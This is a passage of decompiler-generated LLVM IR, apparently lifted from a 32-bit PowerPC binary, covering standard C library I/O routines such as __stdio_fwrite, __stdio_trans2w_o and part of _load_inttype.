  %v3_1000e340 = icmp eq i32 %v1_1000e340, 0
  br i1 %v3_1000e340, label %dec_label_pc_1000e348, label %dec_label_pc_1000e33c.dec_label_pc_1000e350_crit_edge

dec_label_pc_1000e33c.dec_label_pc_1000e350_crit_edge: ; preds = %dec_label_pc_1000e33c
  %v0_1000e354.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e350

dec_label_pc_1000e348:                            ; preds = %dec_label_pc_1000e33c, %dec_label_pc_1000e324
  %v0_1000e348 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e348 = add i32 %v0_1000e348, 1
  store i32 %v1_1000e348, i32* %r11.global-to-local, align 4
  %v0_1000e34c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e34c = add i32 %v0_1000e34c, -1
  store i32 %v1_1000e34c, i32* %ctr.global-to-local, align 4
  %v2_1000e34c = icmp eq i32 %v1_1000e34c, 0
  br i1 %v2_1000e34c, label %dec_label_pc_1000e348.dec_label_pc_1000e350_crit_edge, label %dec_label_pc_1000e324

dec_label_pc_1000e348.dec_label_pc_1000e350_crit_edge: ; preds = %dec_label_pc_1000e348
  %v0_1000e350.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e350

dec_label_pc_1000e350:                            ; preds = %dec_label_pc_1000e33c.dec_label_pc_1000e350_crit_edge, %dec_label_pc_1000e348.dec_label_pc_1000e350_crit_edge
  %v0_1000e354 = phi i32 [ %v1_1000e348, %dec_label_pc_1000e348.dec_label_pc_1000e350_crit_edge ], [ %v0_1000e354.pre, %dec_label_pc_1000e33c.dec_label_pc_1000e350_crit_edge ]
  %v0_1000e350 = phi i32 [ %v0_1000e350.pre, %dec_label_pc_1000e348.dec_label_pc_1000e350_crit_edge ], [ %v0_1000e33c, %dec_label_pc_1000e33c.dec_label_pc_1000e350_crit_edge ]
  %v1_1000e350 = add i32 %v0_1000e350, 8
  %v2_1000e350 = inttoptr i32 %v1_1000e350 to i32*
  %v3_1000e350 = load i32, i32* %v2_1000e350, align 4
  store i32 %v3_1000e350, i32* %r0.global-to-local, align 4
  %v2_1000e354 = add i32 %v0_1000e350, 16
  %v3_1000e354 = inttoptr i32 %v2_1000e354 to i32*
  store i32 %v0_1000e354, i32* %v3_1000e354, align 4
  %v0_1000e358 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e358 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e358 = sub i32 %v1_1000e358, %v0_1000e358
  store i32 %v2_1000e358, i32* %r0.global-to-local, align 4
  %v1_1000e35c = load i32, i32* @r31, align 4
  %v2_1000e35c = sub i32 %v1_1000e35c, %v2_1000e358
  store i32 %v2_1000e35c, i32* @r31, align 4
  br label %dec_label_pc_1000e360

dec_label_pc_1000e360:                            ; preds = %dec_label_pc_1000e2f8.dec_label_pc_1000e360_crit_edge, %dec_label_pc_1000e350
  %v0_1000e360 = phi i32 [ %v0_1000e360.pre, %dec_label_pc_1000e2f8.dec_label_pc_1000e360_crit_edge ], [ %v2_1000e35c, %dec_label_pc_1000e350 ]
  %v1_1000e360 = load i32, i32* @r28, align 4
  %v2_1000e360 = sub i32 %v1_1000e360, %v0_1000e360
  store i32 %v2_1000e360, i32* @r28, align 4
  br label %dec_label_pc_1000e364

dec_label_pc_1000e2bc.dec_label_pc_1000e364.loopexit_crit_edge: ; preds = %dec_label_pc_1000e2ec
  %v0_1000e368.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000e364

dec_label_pc_1000e364:                            ; preds = %entry, %dec_label_pc_1000e2bc.dec_label_pc_1000e364.loopexit_crit_edge, %dec_label_pc_1000e360
  %v0_1000e368 = phi i32 [ %v2_1000e360, %dec_label_pc_1000e360 ], [ %v0_1000e368.pre.pre, %dec_label_pc_1000e2bc.dec_label_pc_1000e364.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1000e29c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e368

; uselistorder directives
  uselistorder i32 %v0_1000e350, { 1, 0 }
  uselistorder i32 %v1_1000e34c, { 1, 0 }
  uselistorder i32 %v1_1000e348, { 0, 2, 1 }
  uselistorder i32 %v1_1000e330, { 1, 0 }
  uselistorder i32 %v2_1000e2f0, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000e2ec, { 1, 0 }
  uselistorder i32 %v3_1000e2e0, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 6, 15, 14, 13, 16, 12, 11, 0, 5, 1, 4, 2, 10, 9, 8, 3, 7 }
  uselistorder label %dec_label_pc_1000e364, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e360, { 1, 0 }
  uselistorder label %dec_label_pc_1000e350, { 1, 0 }
  uselistorder label %dec_label_pc_1000e320, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2cc, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1000e37c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1000e398 = load i16, i16* %arg3, align 2
  %v1_1000e39c = and i16 %v3_1000e398, 512
  %v3_1000e39c = icmp eq i16 %v1_1000e39c, 0
  br i1 %v3_1000e39c, label %dec_label_pc_1000e3a4, label %dec_label_pc_1000e4b0

dec_label_pc_1000e3a4:                            ; preds = %entry
  %v2_1000e3a4 = add i32 %tmp, 4
  %v3_1000e3a4 = inttoptr i32 %v2_1000e3a4 to i32*
  %v4_1000e3a4 = load i32, i32* %v3_1000e3a4, align 4
  %v2_1000e3a8 = add i32 %tmp, 16
  %v3_1000e3a8 = inttoptr i32 %v2_1000e3a8 to i32*
  %v4_1000e3a8 = load i32, i32* %v3_1000e3a8, align 4
  store i32 %v4_1000e3a8, i32* @r3, align 4
  %v3_1000e3ac = icmp eq i32 %v4_1000e3a4, -2
  %v2_1000e3b0 = add i32 %tmp, 12
  %v3_1000e3b0 = inttoptr i32 %v2_1000e3b0 to i32*
  %v4_1000e3b0 = load i32, i32* %v3_1000e3b0, align 4
  %v2_1000e3b8 = sub i32 %v4_1000e3b0, %v4_1000e3a8
  br i1 %v3_1000e3ac, label %dec_label_pc_1000e3b8, label %dec_label_pc_1000e3e8

dec_label_pc_1000e3b8:                            ; preds = %dec_label_pc_1000e3a4
  %v3_1000e3c0 = icmp ult i32 %v2_1000e3b8, %arg2
  br i1 %v3_1000e3c0, label %dec_label_pc_1000e3c8, label %dec_label_pc_1000e3cc

dec_label_pc_1000e3c8:                            ; preds = %dec_label_pc_1000e3b8
  br label %dec_label_pc_1000e3cc

dec_label_pc_1000e3cc:                            ; preds = %dec_label_pc_1000e3b8, %dec_label_pc_1000e3c8
  %storemerge = phi i32 [ %v2_1000e3b8, %dec_label_pc_1000e3c8 ], [ %arg2, %dec_label_pc_1000e3b8 ]
  %v0_1000e3d0 = phi i32 [ %v2_1000e3b8, %dec_label_pc_1000e3c8 ], [ %arg2, %dec_label_pc_1000e3b8 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1000e3d0, i32* @r5, align 4
  store i32 268493784, i32* @lr, align 4
  %v0_1000e3d4 = call i32 @memcpy()
  %v0_1000e3d8 = load i32, i32* @r30, align 4
  %v1_1000e3d8 = add i32 %v0_1000e3d8, 16
  %v2_1000e3d8 = inttoptr i32 %v1_1000e3d8 to i32*
  %v3_1000e3d8 = load i32, i32* %v2_1000e3d8, align 4
  %v1_1000e3dc = load i32, i32* @r31, align 4
  %v2_1000e3dc = add i32 %v1_1000e3dc, %v3_1000e3d8
  store i32 %v2_1000e3dc, i32* %v2_1000e3d8, align 4
  br label %dec_label_pc_1000e4d0

dec_label_pc_1000e3e8:                            ; preds = %dec_label_pc_1000e3a4
  %v3_1000e3ec = icmp ult i32 %v2_1000e3b8, %arg2
  br i1 %v3_1000e3ec, label %dec_label_pc_1000e48c, label %dec_label_pc_1000e3f4

dec_label_pc_1000e3f4:                            ; preds = %dec_label_pc_1000e3e8
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268493824, i32* @lr, align 4
  %v0_1000e3fc = call i32 @memcpy()
  %v0_1000e400 = load i32, i32* @r30, align 4
  %v1_1000e400 = inttoptr i32 %v0_1000e400 to i16*
  %v2_1000e400 = load i16, i16* %v1_1000e400, align 2
  %v1_1000e404 = add i32 %v0_1000e400, 16
  %v2_1000e404 = inttoptr i32 %v1_1000e404 to i32*
  %v3_1000e404 = load i32, i32* %v2_1000e404, align 4
  %v1_1000e408 = and i16 %v2_1000e400, 256
  %v3_1000e408 = icmp eq i16 %v1_1000e408, 0
  %v1_1000e40c = load i32, i32* @r29, align 4
  %v2_1000e40c = add i32 %v1_1000e40c, %v3_1000e404
  store i32 %v2_1000e40c, i32* %v2_1000e404, align 4
  br i1 %v3_1000e408, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e418

dec_label_pc_1000e418:                            ; preds = %dec_label_pc_1000e3f4
  %v0_1000e418 = load i32, i32* @r28, align 4
  %v0_1000e420 = load i32, i32* @r29, align 4
  store i32 268493864, i32* @lr, align 4
  %v4_1000e424 = call i32 @memrchr(i32 %v0_1000e418, i32 10, i32 %v0_1000e420, i32 %v2_1000e40c)
  %v3_1000e428 = icmp eq i32 %v4_1000e424, 0
  br i1 %v3_1000e428, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e430

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e418
  %v0_1000e430 = load i32, i32* @r30, align 4
  store i32 %v0_1000e430, i32* @r3, align 4
  store i32 268493880, i32* @lr, align 4
  %v0_1000e434 = call i32 @__stdio_wcommit()
  %v3_1000e438 = icmp eq i32 %v0_1000e434, 0
  br i1 %v3_1000e438, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e440

dec_label_pc_1000e440:                            ; preds = %dec_label_pc_1000e430
  %v0_1000e440 = load i32, i32* @r29, align 4
  %v3_1000e440 = icmp ugt i32 %v0_1000e440, %v0_1000e434
  %v0_1000e434.v0_1000e444 = select i1 %v3_1000e440, i32 %v0_1000e434, i32 %v0_1000e440
  store i32 %v0_1000e434.v0_1000e444, i32* @r31, align 4
  %v2_1000e450 = sub i32 %v0_1000e440, %v0_1000e434.v0_1000e444
  %v0_1000e458 = load i32, i32* @r28, align 4
  %v2_1000e458 = add i32 %v0_1000e458, %v2_1000e450
  store i32 %v2_1000e458, i32* @r28, align 4
  store i32 %v2_1000e458, i32* @r3, align 4
  store i32 268493928, i32* @lr, align 4
  %v3_1000e464 = call i32 @__GI_memchr(i32 %v2_1000e458, i32 10, i32 %v0_1000e434.v0_1000e444)
  %v3_1000e468 = icmp eq i32 %v3_1000e464, 0
  br i1 %v3_1000e468, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e470

dec_label_pc_1000e470:                            ; preds = %dec_label_pc_1000e440
  %v0_1000e470 = load i32, i32* @r30, align 4
  %v1_1000e470 = add i32 %v0_1000e470, 16
  %v2_1000e470 = inttoptr i32 %v1_1000e470 to i32*
  %v3_1000e470 = load i32, i32* %v2_1000e470, align 4
  %v0_1000e474 = load i32, i32* @r28, align 4
  %v1_1000e474 = load i32, i32* @r31, align 4
  %v2_1000e474 = sub i32 %v0_1000e474, %v3_1000e464
  %v2_1000e478 = add i32 %v2_1000e474, %v1_1000e474
  %v2_1000e47c = sub i32 %v3_1000e470, %v2_1000e478
  %v1_1000e480 = load i32, i32* @r29, align 4
  %v2_1000e480 = sub i32 %v1_1000e480, %v2_1000e478
  store i32 %v2_1000e480, i32* @r29, align 4
  store i32 %v2_1000e47c, i32* %v2_1000e470, align 4
  br label %dec_label_pc_1000e4d0

dec_label_pc_1000e48c:                            ; preds = %dec_label_pc_1000e3e8
  %v2_1000e48c = add i32 %tmp, 8
  %v3_1000e48c = inttoptr i32 %v2_1000e48c to i32*
  %v4_1000e48c = load i32, i32* %v3_1000e48c, align 4
  %v4_1000e490 = icmp eq i32 %v4_1000e3a8, %v4_1000e48c
  br i1 %v4_1000e490, label %dec_label_pc_1000e4b0, label %dec_label_pc_1000e498

dec_label_pc_1000e498:                            ; preds = %dec_label_pc_1000e48c
  store i32 %tmp, i32* @r3, align 4
  store i32 268493984, i32* @lr, align 4
  %v0_1000e49c = call i32 @__stdio_wcommit()
  %v3_1000e4a0 = icmp eq i32 %v0_1000e49c, 0
  br i1 %v3_1000e4a0, label %dec_label_pc_1000e498.dec_label_pc_1000e4b0_crit_edge, label %dec_label_pc_1000e4a8

dec_label_pc_1000e498.dec_label_pc_1000e4b0_crit_edge: ; preds = %dec_label_pc_1000e498
  %v0_1000e4b4.pre = load i32, i32* @r30, align 4
  %v0_1000e4b8.pre = load i32, i32* @r28, align 4
  %v0_1000e4bc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e4b0

dec_label_pc_1000e4a8:                            ; preds = %dec_label_pc_1000e498
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000e4d0

dec_label_pc_1000e4b0:                            ; preds = %dec_label_pc_1000e498.dec_label_pc_1000e4b0_crit_edge, %entry, %dec_label_pc_1000e48c
  %v0_1000e4bc = phi i32 [ %v0_1000e4bc.pre, %dec_label_pc_1000e498.dec_label_pc_1000e4b0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000e48c ]
  %v0_1000e4b8 = phi i32 [ %v0_1000e4b8.pre, %dec_label_pc_1000e498.dec_label_pc_1000e4b0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000e48c ]
  %v0_1000e4b4 = phi i32 [ %v0_1000e4b4.pre, %dec_label_pc_1000e498.dec_label_pc_1000e4b0_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000e48c ]
  %v1_1000e4b4 = inttoptr i32 %v0_1000e4b4 to i16*
  store i32 %v0_1000e4bc, i32* @r5, align 4
  store i32 %v0_1000e37c, i32* @lr, align 4
  %v5_1000e4cc = call i32 @__stdio_WRITE(i16* %v1_1000e4b4, i32 %v0_1000e4b8)
  br label %dec_label_pc_1000e4d0

dec_label_pc_1000e4d0:                            ; preds = %dec_label_pc_1000e440, %dec_label_pc_1000e430, %dec_label_pc_1000e418, %dec_label_pc_1000e3f4, %dec_label_pc_1000e4a8, %dec_label_pc_1000e470, %dec_label_pc_1000e3cc, %dec_label_pc_1000e4b0
  %v0_1000e4d4 = load i32, i32* @r29, align 4
  ret i32 %v0_1000e4d4

; uselistorder directives
  uselistorder i32 %v2_1000e478, { 1, 0 }
  uselistorder i32 %v0_1000e434.v0_1000e444, { 0, 2, 1 }
  uselistorder i32 %v0_1000e440, { 1, 0, 2 }
  uselistorder i32 %v2_1000e3b8, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000e4d0, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000e4b0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e3cc, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000e4e8 = load i32, i32* @lr, align 4
  store i32 %v0_1000e4e8, i32* %r0.global-to-local, align 4
  %v0_1000e4f0 = load i32, i32* @r31, align 4
  %v0_1000e4f4 = load i32, i32* @r3, align 4
  store i32 %v0_1000e4f4, i32* @r31, align 4
  %v1_1000e4fc = inttoptr i32 %v0_1000e4f4 to i16*
  %v2_1000e4fc = load i16, i16* %v1_1000e4fc, align 2
  %v3_1000e4fc = zext i16 %v2_1000e4fc to i32
  store i32 %v3_1000e4fc, i32* %r0.global-to-local, align 4
  %v1_1000e500 = load i32, i32* @r4, align 4
  %v2_1000e500 = and i32 %v1_1000e500, %v3_1000e4fc
  store i32 %v2_1000e500, i32* %r9.global-to-local, align 4
  %v5_1000e500 = icmp eq i32 %v2_1000e500, 0
  br i1 %v5_1000e500, label %dec_label_pc_1000e508, label %dec_label_pc_1000e518

dec_label_pc_1000e508:                            ; preds = %entry
  %v1_1000e508 = and i32 %v3_1000e4fc, 2176
  store i32 %v1_1000e508, i32* %r9.global-to-local, align 4
  %v3_1000e508 = icmp eq i32 %v1_1000e508, 0
  br i1 %v3_1000e508, label %dec_label_pc_1000e510, label %dec_label_pc_1000e524

dec_label_pc_1000e510:                            ; preds = %dec_label_pc_1000e508
  %v2_1000e510 = or i32 %v1_1000e500, %v3_1000e4fc
  store i32 %v2_1000e510, i32* %r0.global-to-local, align 4
  %v1_1000e514 = trunc i32 %v2_1000e510 to i16
  store i16 %v1_1000e514, i16* %v1_1000e4fc, align 2
  %v0_1000e518.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e518

dec_label_pc_1000e518:                            ; preds = %entry, %dec_label_pc_1000e510
  %v0_1000e554 = phi i32 [ %v0_1000e4f4, %entry ], [ %v0_1000e518.pre, %dec_label_pc_1000e510 ]
  %v1_1000e518 = inttoptr i32 %v0_1000e554 to i16*
  %v2_1000e518 = load i16, i16* %v1_1000e518, align 2
  %v3_1000e518 = zext i16 %v2_1000e518 to i32
  %v1_1000e51c = and i32 %v3_1000e518, 32
  store i32 %v1_1000e51c, i32* %r0.global-to-local, align 4
  %v3_1000e51c = icmp eq i32 %v1_1000e51c, 0
  br i1 %v3_1000e51c, label %dec_label_pc_1000e544, label %dec_label_pc_1000e524

dec_label_pc_1000e524:                            ; preds = %dec_label_pc_1000e508, %dec_label_pc_1000e518
  %v0_1000e524 = call i32 @__errno_location()
  store i32 %v0_1000e524, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1000e52c = inttoptr i32 %v0_1000e524 to i32*
  store i32 9, i32* %v2_1000e52c, align 4
  br label %dec_label_pc_1000e530

dec_label_pc_1000e530:                            ; preds = %dec_label_pc_1000e56c, %dec_label_pc_1000e524
  %v0_1000e530 = load i32, i32* @r31, align 4
  %v1_1000e530 = inttoptr i32 %v0_1000e530 to i16*
  %v2_1000e530 = load i16, i16* %v1_1000e530, align 2
  %v3_1000e530 = zext i16 %v2_1000e530 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000e538 = or i32 %v3_1000e530, 8
  store i32 %v1_1000e538, i32* %r0.global-to-local, align 4
  %v1_1000e53c = trunc i32 %v1_1000e538 to i16
  store i16 %v1_1000e53c, i16* %v1_1000e530, align 2
  br label %dec_label_pc_1000e5cc

dec_label_pc_1000e544:                            ; preds = %dec_label_pc_1000e518
  %tmp = urem i16 %v2_1000e518, 4
  %v1_1000e544 = zext i16 %tmp to i32
  store i32 %v1_1000e544, i32* %r0.global-to-local, align 4
  %v3_1000e544 = icmp eq i16 %tmp, 0
  br i1 %v3_1000e544, label %dec_label_pc_1000e5a8, label %dec_label_pc_1000e54c

dec_label_pc_1000e54c:                            ; preds = %dec_label_pc_1000e544
  %v1_1000e54c = and i32 %v3_1000e518, 4
  store i32 %v1_1000e54c, i32* %r9.global-to-local, align 4
  %v3_1000e54c = icmp eq i32 %v1_1000e54c, 0
  br i1 %v3_1000e54c, label %dec_label_pc_1000e554, label %dec_label_pc_1000e58c

dec_label_pc_1000e554:                            ; preds = %dec_label_pc_1000e54c
  %v1_1000e554 = add i32 %v0_1000e554, 20
  %v2_1000e554 = inttoptr i32 %v1_1000e554 to i32*
  %v3_1000e554 = load i32, i32* %v2_1000e554, align 4
  store i32 %v3_1000e554, i32* %r0.global-to-local, align 4
  %v1_1000e558 = add i32 %v0_1000e554, 16
  %v2_1000e558 = inttoptr i32 %v1_1000e558 to i32*
  %v3_1000e558 = load i32, i32* %v2_1000e558, align 4
  store i32 %v3_1000e558, i32* %r9.global-to-local, align 4
  %v4_1000e55c = icmp eq i32 %v3_1000e554, %v3_1000e558
  br i1 %v4_1000e55c, label %dec_label_pc_1000e564, label %dec_label_pc_1000e56c

dec_label_pc_1000e564:                            ; preds = %dec_label_pc_1000e554
  %v1_1000e564 = and i32 %v3_1000e518, 2
  store i32 %v1_1000e564, i32* %r0.global-to-local, align 4
  %v3_1000e564 = icmp eq i32 %v1_1000e564, 0
  br i1 %v3_1000e564, label %dec_label_pc_1000e58c, label %dec_label_pc_1000e56c

dec_label_pc_1000e56c:                            ; preds = %dec_label_pc_1000e554, %dec_label_pc_1000e564
  %v1_1000e56c = and i32 %v3_1000e518, 1024
  store i32 %v1_1000e56c, i32* %r9.global-to-local, align 4
  %v0_1000e574 = call i32 @__asm_mfcr()
  store i32 %v0_1000e574, i32* %r3.global-to-local, align 4
  %v1_1000e578 = call i32 @__asm_rlwinm(i32 %v0_1000e574, i32 3, i32 31, i32 31)
  %v1_1000e57c = sub i32 2, %v1_1000e578
  store i32 %v1_1000e57c, i32* @r5, align 4
  store i32 268494212, i32* @lr, align 4
  %v1_1000e580 = call i32 @__GI_fseek(i32 %v1_1000e57c)
  store i32 %v1_1000e580, i32* %r3.global-to-local, align 4
  %v3_1000e584 = icmp eq i32 %v1_1000e580, 0
  br i1 %v3_1000e584, label %dec_label_pc_1000e56c.dec_label_pc_1000e58c_crit_edge, label %dec_label_pc_1000e530

dec_label_pc_1000e56c.dec_label_pc_1000e58c_crit_edge: ; preds = %dec_label_pc_1000e56c
  %v0_1000e58c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e58c

dec_label_pc_1000e58c:                            ; preds = %dec_label_pc_1000e56c.dec_label_pc_1000e58c_crit_edge, %dec_label_pc_1000e54c, %dec_label_pc_1000e564
  %v0_1000e58c = phi i32 [ %v0_1000e58c.pre, %dec_label_pc_1000e56c.dec_label_pc_1000e58c_crit_edge ], [ %v0_1000e554, %dec_label_pc_1000e54c ], [ %v0_1000e554, %dec_label_pc_1000e564 ]
  %v1_1000e58c = inttoptr i32 %v0_1000e58c to i16*
  %v2_1000e58c = load i16, i16* %v1_1000e58c, align 2
  %v3_1000e58c = zext i16 %v2_1000e58c to i32
  store i32 %v3_1000e58c, i32* %r0.global-to-local, align 4
  %v1_1000e590 = add i32 %v0_1000e58c, 8
  %v2_1000e590 = inttoptr i32 %v1_1000e590 to i32*
  %v3_1000e590 = load i32, i32* %v2_1000e590, align 4
  store i32 %v3_1000e590, i32* %r9.global-to-local, align 4
  %v1_1000e594 = call i32 @__asm_rlwinm(i32 %v3_1000e58c, i32 0, i32 0, i32 29)
  %v2_1000e594 = trunc i32 %v1_1000e594 to i16
  store i32 %v1_1000e594, i32* %r0.global-to-local, align 4
  %v3_1000e598 = load i32, i32* @r31, align 4
  %v4_1000e598 = inttoptr i32 %v3_1000e598 to i16*
  store i16 %v2_1000e594, i16* %v4_1000e598, align 2
  %v0_1000e59c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e59c = load i32, i32* @r31, align 4
  %v2_1000e59c = add i32 %v1_1000e59c, 20
  %v3_1000e59c = inttoptr i32 %v2_1000e59c to i32*
  store i32 %v0_1000e59c, i32* %v3_1000e59c, align 4
  %v0_1000e5a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e5a0 = load i32, i32* @r31, align 4
  %v2_1000e5a0 = add i32 %v1_1000e5a0, 24
  %v3_1000e5a0 = inttoptr i32 %v2_1000e5a0 to i32*
  store i32 %v0_1000e5a0, i32* %v3_1000e5a0, align 4
  %v0_1000e5a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e5a4 = load i32, i32* @r31, align 4
  %v2_1000e5a4 = add i32 %v1_1000e5a4, 16
  %v3_1000e5a4 = inttoptr i32 %v2_1000e5a4 to i32*
  store i32 %v0_1000e5a4, i32* %v3_1000e5a4, align 4
  %v0_1000e5a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e5a8

dec_label_pc_1000e5a8:                            ; preds = %dec_label_pc_1000e544, %dec_label_pc_1000e58c
  %v2_1000e5b4 = phi i32 [ %v0_1000e554, %dec_label_pc_1000e544 ], [ %v0_1000e5a8.pre, %dec_label_pc_1000e58c ]
  %v1_1000e5a8 = inttoptr i32 %v2_1000e5b4 to i16*
  %v2_1000e5a8 = load i16, i16* %v1_1000e5a8, align 2
  %v3_1000e5a8 = zext i16 %v2_1000e5a8 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e5b0 = or i32 %v3_1000e5a8, 64
  store i32 %v1_1000e5b0, i32* %r0.global-to-local, align 4
  %v1_1000e5b4 = trunc i32 %v1_1000e5b0 to i16
  store i16 %v1_1000e5b4, i16* %v1_1000e5a8, align 2
  %v0_1000e5b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e5b8 = urem i32 %v0_1000e5b8, 65536
  store i32 %v1_1000e5b8, i32* %r0.global-to-local, align 4
  %v1_1000e5bc = and i32 %v0_1000e5b8, 2816
  store i32 %v1_1000e5bc, i32* %r9.global-to-local, align 4
  %v3_1000e5bc = icmp eq i32 %v1_1000e5bc, 0
  br i1 %v3_1000e5bc, label %dec_label_pc_1000e5c4, label %dec_label_pc_1000e5cc

dec_label_pc_1000e5c4:                            ; preds = %dec_label_pc_1000e5a8
  %v0_1000e5c4 = load i32, i32* @r31, align 4
  %v1_1000e5c4 = add i32 %v0_1000e5c4, 12
  %v2_1000e5c4 = inttoptr i32 %v1_1000e5c4 to i32*
  %v3_1000e5c4 = load i32, i32* %v2_1000e5c4, align 4
  store i32 %v3_1000e5c4, i32* %r0.global-to-local, align 4
  %v2_1000e5c8 = add i32 %v0_1000e5c4, 28
  %v3_1000e5c8 = inttoptr i32 %v2_1000e5c8 to i32*
  store i32 %v3_1000e5c4, i32* %v3_1000e5c8, align 4
  br label %dec_label_pc_1000e5cc

dec_label_pc_1000e5cc:                            ; preds = %dec_label_pc_1000e5a8, %dec_label_pc_1000e530, %dec_label_pc_1000e5c4
  store i32 %v0_1000e4e8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e4f0, i32* @r31, align 4
  %v0_1000e5dc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e5dc

; uselistorder directives
  uselistorder i32 %v0_1000e5b8, { 1, 0 }
  uselistorder i32 %v1_1000e594, { 1, 0 }
  uselistorder i32 %v0_1000e58c, { 1, 0 }
  uselistorder i32 %v0_1000e554, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_1000e4fc, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_1000e5cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e5a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e58c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e56c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e524, { 1, 0 }
  uselistorder label %dec_label_pc_1000e518, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_1000e5e0 = load i32, i32* @r5, align 4
  %v1_1000e5e0 = icmp slt i32 %v0_1000e5e0, 0
  %v1_1000e5e4 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_1000e620 = icmp eq i32 %v1_1000e5e4, 0
  br i1 %v1_1000e5e0, label %dec_label_pc_1000e620, label %dec_label_pc_1000e5ec

dec_label_pc_1000e5ec:                            ; preds = %entry
  br i1 %v3_1000e620, label %dec_label_pc_1000e5f4, label %dec_label_pc_1000e628

dec_label_pc_1000e5f4:                            ; preds = %dec_label_pc_1000e5ec
  %v3_1000e5f4 = icmp eq i32 %arg1, 256
  br i1 %v3_1000e5f4, label %dec_label_pc_1000e600, label %dec_label_pc_1000e608

dec_label_pc_1000e600:                            ; preds = %dec_label_pc_1000e5f4
  br label %dec_label_pc_1000e614

dec_label_pc_1000e608:                            ; preds = %dec_label_pc_1000e5f4
  %v3_1000e608 = icmp eq i32 %arg1, 512
  br i1 %v3_1000e608, label %dec_label_pc_1000e610, label %dec_label_pc_1000e614

dec_label_pc_1000e610:                            ; preds = %dec_label_pc_1000e608
  br label %dec_label_pc_1000e614

dec_label_pc_1000e614:                            ; preds = %dec_label_pc_1000e608, %dec_label_pc_1000e600, %dec_label_pc_1000e610
  ret i32 0

dec_label_pc_1000e620:                            ; preds = %entry
  br i1 %v3_1000e620, label %dec_label_pc_1000e634, label %dec_label_pc_1000e628

dec_label_pc_1000e628:                            ; preds = %dec_label_pc_1000e5ec, %dec_label_pc_1000e620
  %v2_1000e628 = load i32, i32* %arg2, align 4
  ret i32 %v2_1000e628

dec_label_pc_1000e634:                            ; preds = %dec_label_pc_1000e620
  %v3_1000e634 = icmp eq i32 %arg1, 256
  %v2_1000e638 = load i32, i32* %arg2, align 4
  br i1 %v3_1000e634, label %dec_label_pc_1000e640, label %dec_label_pc_1000e648

dec_label_pc_1000e640:                            ; preds = %dec_label_pc_1000e634
  %v1_1000e640 = urem i32 %v2_1000e638, 256
  br label %dec_label_pc_1000e654

dec_label_pc_1000e648:                            ; preds = %dec_label_pc_1000e634
  %v3_1000e648 = icmp eq i32 %arg1, 512
